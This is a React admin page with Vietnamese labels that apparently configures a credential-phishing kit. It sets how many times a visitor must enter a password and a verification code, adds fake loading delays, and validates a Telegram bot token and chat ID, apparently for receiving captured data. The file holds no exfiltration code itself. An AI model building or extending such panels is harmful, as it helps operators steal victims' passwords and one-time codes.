import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router';
import { faGear, faPaperPlane, faCheck, faXmark } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { TypeAnimation } from 'react-type-animation';
import TelegramPost from '@/components/telegram-post';
import debounce from 'lodash/debounce';
import toast from 'react-hot-toast';

interface WebsiteConfig {
  maxPasswordAttempts: number | '';
  maxCodeAttempts: number | '';
  codeLoadingTime: number | '';
  passwordLoadingTime: number | '';
}

interface TelegramConfig {
  token: string;
  chatId: string;
}

interface TelegramChatResponse {
  ok: boolean;
  result?: {
    title?: string;
    type?: string;
    first_name?: string;
    username?: string;
    id?: number;
    bio?: string;
    personal_chat?: {
      id?: number;
      title?: string;
      username?: string;
      type?: string;
    };
  };
  description?: string;
}

const Admin: React.FC = () => {
  const navigate = useNavigate();
  const [websiteConfig, setWebsiteConfig] = useState<WebsiteConfig>({
    maxPasswordAttempts: '',
    maxCodeAttempts: '',
    codeLoadingTime: '',
    passwordLoadingTime: '',
  });

  const [telegramConfig, setTelegramConfig] = useState<TelegramConfig>({
    token: '',
    chatId: '',
  });

  const [isSaving, setIsSaving] = useState(false);
  const [telegramValidation, setTelegramValidation] = useState<{
    isValid: boolean;
    message: string;
  }>({ isValid: false, message: '' });

  useEffect(() => {
    const isLoggedIn = localStorage.getItem('isLoggedIn');
    if (!isLoggedIn) {
      navigate('/admin/login');
    }
  }, [navigate]);

  const handleWebsiteConfigChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setWebsiteConfig(prev => ({
      ...prev,
      [name]: value === '' ? '' : Number(value),
    }));
  };

  const validateTelegramConfig = async (token: string, chatId: string) => {
    if (!token || !chatId) {
      setTelegramValidation({ isValid: false, message: '' });
      return;
    }

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${token}/getChat?chat_id=${chatId}`,
      );
      const data: TelegramChatResponse = await response.json();

      if (data.ok) {
        const chatInfo = [
          `Kết nối thành công`,
          `Loại: ${data.result?.type === 'private' ? 'Chat riêng tư' : 'Nhóm/Kênh'}`,
          `Tên: ${data.result?.first_name ?? data.result?.title ?? 'Không có tên'}`,
          `Username: ${data.result?.username ? '@' + data.result.username : 'Không có'}`,
          `Chat ID: ${chatId}`,
          data.result?.bio ? `Bio: ${data.result.bio}` : null,
          data.result?.personal_chat?.title
            ? `Kênh liên kết: ${data.result.personal_chat.title}`
            : null,
        ]
          .filter(Boolean)
          .join('\n\n');

        setTelegramValidation({
          isValid: true,
          message: chatInfo,
        });
      } else {
        setTelegramValidation({
          isValid: false,
          message: `Lỗi: ${data.description ?? 'Cấu hình không hợp lệ'}`,
        });
      }
    } catch {
      setTelegramValidation({
        isValid: false,
        message: 'Không thể kết nối tới Telegram. Vui lòng kiểm tra lại token và chat ID',
      });
    }
  };

  const debouncedValidation = debounce(validateTelegramConfig, 500);

  const handleTelegramConfigChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    const newConfig = {
      ...telegramConfig,
      [name]: value,
    };
    setTelegramConfig(newConfig);
    debouncedValidation(newConfig.token, newConfig.chatId);
  };

  const handleSave = async () => {
    setIsSaving(true);
    try {
      await new Promise(resolve => setTimeout(resolve, 1000));

      localStorage.setItem('websiteConfig', JSON.stringify(websiteConfig));
      localStorage.setItem('telegramConfig', JSON.stringify(telegramConfig));

      toast.success('Lưu cấu hình thành công!');
    } catch {
      toast.error('Lưu cấu hình thất bại');
    } finally {
      setIsSaving(false);
    }
  };

  return (
    <div className="min-h-screen w-full bg-gray-50">
      <div className="flex min-h-screen flex-col items-center justify-start px-4 py-16 sm:px-6 lg:px-8">
        <div className="w-full max-w-7xl">
          <div className="mb-16 text-center">
            <TypeAnimation
              sequence={['Trang Quản Trị', 1000]}
              wrapper="h1"
              speed={50}
              className="mb-8 text-4xl font-bold text-black"
              repeat={0}
            />
            <button
              onClick={() => {
                localStorage.removeItem('isLoggedIn');
                navigate('/admin/login');
              }}
              className="group relative cursor-pointer overflow-hidden rounded-xl bg-black px-8 py-3 text-base font-semibold text-white transition-all duration-300 hover:shadow-xl active:shadow-none"
            >
              <span className="relative z-10">Đăng xuất</span>
              <div className="absolute inset-0 bg-gradient-to-r from-black via-gray-900 to-black opacity-0 transition-opacity duration-300 group-hover:opacity-100"></div>
            </button>
          </div>

          <div className="grid grid-cols-1 gap-10 lg:grid-cols-2">
            <div className="rounded-3xl border border-gray-200 bg-white p-10 shadow-lg transition-all duration-300 hover:shadow-xl">
              <div className="mb-8 flex items-center">
                <FontAwesomeIcon icon={faGear} className="mr-3 h-6 w-6 text-black" />
                <h2 className="text-2xl font-bold text-black">Cấu Hình Website</h2>
              </div>
              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-gray-700">
                    Số Lần Nhập Mật Khẩu
                    <div className="group mt-2">
                      <input
                        type="number"
                        name="maxPasswordAttempts"
                        value={websiteConfig.maxPasswordAttempts}
                        onChange={handleWebsiteConfigChange}
                        className="block w-full rounded-xl border border-gray-200 bg-gray-50/50 px-4 py-3.5 text-black shadow-sm transition-all duration-300 group-hover:shadow-md placeholder:text-gray-400 hover:border-gray-300 focus:border-black focus:bg-white focus:ring-1 focus:ring-black focus:outline-none"
                      />
                    </div>
                  </label>
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700">
                    Số Lần Sai Code
                    <div className="group mt-2">
                      <input
                        type="number"
                        name="maxCodeAttempts"
                        value={websiteConfig.maxCodeAttempts}
                        onChange={handleWebsiteConfigChange}
                        className="block w-full rounded-xl border border-gray-200 bg-gray-50/50 px-4 py-3.5 text-black shadow-sm transition-all duration-300 group-hover:shadow-md placeholder:text-gray-400 hover:border-gray-300 focus:border-black focus:bg-white focus:ring-1 focus:ring-black focus:outline-none"
                      />
                    </div>
                  </label>
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700">
                    Thời Gian Load Code (ms)
                    <div className="group mt-2">
                      <input
                        type="number"
                        name="codeLoadingTime"
                        value={websiteConfig.codeLoadingTime}
                        onChange={handleWebsiteConfigChange}
                        className="block w-full rounded-xl border border-gray-200 bg-gray-50/50 px-4 py-3.5 text-black shadow-sm transition-all duration-300 group-hover:shadow-md placeholder:text-gray-400 hover:border-gray-300 focus:border-black focus:bg-white focus:ring-1 focus:ring-black focus:outline-none"
                      />
                    </div>
                  </label>
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700">
                    Thời Gian Load Password (ms)
                    <div className="group mt-2">
                      <input
                        type="number"
                        name="passwordLoadingTime"
                        value={websiteConfig.passwordLoadingTime}
                        onChange={handleWebsiteConfigChange}
                        className="block w-full rounded-xl border border-gray-200 bg-gray-50/50 px-4 py-3.5 text-black shadow-sm transition-all duration-300 group-hover:shadow-md placeholder:text-gray-400 hover:border-gray-300 focus:border-black focus:bg-white focus:ring-1 focus:ring-black focus:outline-none"
                      />
                    </div>
                  </label>
                </div>
              </div>
            </div>

            <div className="rounded-3xl border border-gray-200 bg-white p-10 shadow-lg transition-all duration-300 hover:shadow-xl">
              <div className="mb-8 flex items-center">
                <FontAwesomeIcon icon={faPaperPlane} className="mr-3 h-6 w-6 text-black" />
                <h2 className="text-2xl font-bold text-black">Cấu Hình Telegram</h2>
              </div>
              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-gray-700">
                    Mã Bot Token
                    <div className="group mt-2">
                      <input
                        type="text"
                        name="token"
                        value={telegramConfig.token}
                        onChange={handleTelegramConfigChange}
                        className="block w-full rounded-xl border border-gray-200 bg-gray-50/50 px-4 py-3.5 text-black shadow-sm transition-all duration-300 group-hover:shadow-md placeholder:text-gray-400 hover:border-gray-300 focus:border-black focus:bg-white focus:ring-1 focus:ring-black focus:outline-none"
                      />
                    </div>
                  </label>
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700">
                    Mã Chat ID
                    <div className="group mt-2">
                      <input
                        type="text"
                        name="chatId"
                        value={telegramConfig.chatId}
                        onChange={handleTelegramConfigChange}
                        className="block w-full rounded-xl border border-gray-200 bg-gray-50/50 px-4 py-3.5 text-black shadow-sm transition-all duration-300 group-hover:shadow-md placeholder:text-gray-400 hover:border-gray-300 focus:border-black focus:bg-white focus:ring-1 focus:ring-black focus:outline-none"
                      />
                    </div>
                  </label>
                </div>
                {telegramValidation.message && (
                  <div
                    className={`mt-4 rounded-xl border ${
                      telegramValidation.isValid
                        ? 'border-gray-200 bg-white'
                        : 'border-red-200 bg-red-50'
                    } p-4`}
                  >
                    {telegramValidation.isValid ? (
                      <div className="space-y-2">
                        <div className="flex items-center text-black">
                          <FontAwesomeIcon icon={faCheck} className="mr-2 h-5 w-5 text-black" />
                          <span className="font-medium">Kết nối thành công</span>
                        </div>
                        <div className="ml-7 space-y-1 text-sm text-gray-600">
                          {telegramValidation.message
                            .split('\n\n')
                            .slice(1)
                            .map(line => {
                              const label = line.split(':')[0];
                              const username = line.startsWith('Username: @')
                                ? line.split('@')[1]
                                : '';

                              return (
                                <div key={`telegram-info-${label}`} className="flex items-start">
                                  <span className="mr-2">•</span>
                                  {username ? (
                                    <span>
                                      Username:{' '}
                                      <a
                                        href={`tg://resolve?domain=${username}`}
                                        className="text-black hover:underline"
                                      >
                                        @{username}
                                      </a>
                                    </span>
                                  ) : (
                                    <span>{line}</span>
                                  )}
                                </div>
                              );
                            })}
                        </div>
                      </div>
                    ) : (
                      <div className="flex items-center text-red-600">
                        <FontAwesomeIcon icon={faXmark} className="mr-2 h-5 w-5" />
                        <span>{telegramValidation.message}</span>
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>

            <div className="col-span-1 mt-6 flex justify-end lg:col-span-2">
              <button
                onClick={handleSave}
                disabled={isSaving || !telegramValidation.isValid}
                className={`group relative overflow-hidden rounded-xl px-8 py-3 text-base font-semibold transition-all duration-300 ${
                  isSaving || !telegramValidation.isValid
                    ? 'cursor-not-allowed bg-gray-300 text-gray-500'
                    : 'cursor-pointer bg-black text-white hover:shadow-xl active:shadow-none'
                }`}
              >
                <span className="relative z-10">{isSaving ? 'Đang Lưu...' : 'Lưu Thay Đổi'}</span>
                <div className="absolute inset-0 bg-gradient-to-r from-black via-gray-900 to-black opacity-0 transition-opacity duration-300 group-hover:opacity-100"></div>
              </button>
            </div>
          </div>

          <div className="mt-10 rounded-3xl border border-gray-200 bg-white p-4 shadow-lg transition-all duration-300 hover:shadow-xl sm:p-6 lg:p-10">
            <div className="mb-8 flex items-center">
              <FontAwesomeIcon
                icon={faPaperPlane}
                className="mr-3 h-5 w-5 text-black sm:h-6 sm:w-6"
              />
              <h2 className="text-xl font-bold text-black sm:text-2xl">
                Hướng Dẫn Lấy ChatID Và Bot Token
              </h2>
            </div>
            <div className="relative w-full overflow-hidden rounded-xl">
              <TelegramPost postUrl="https://t.me/OvFSupport/7" />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Admin;
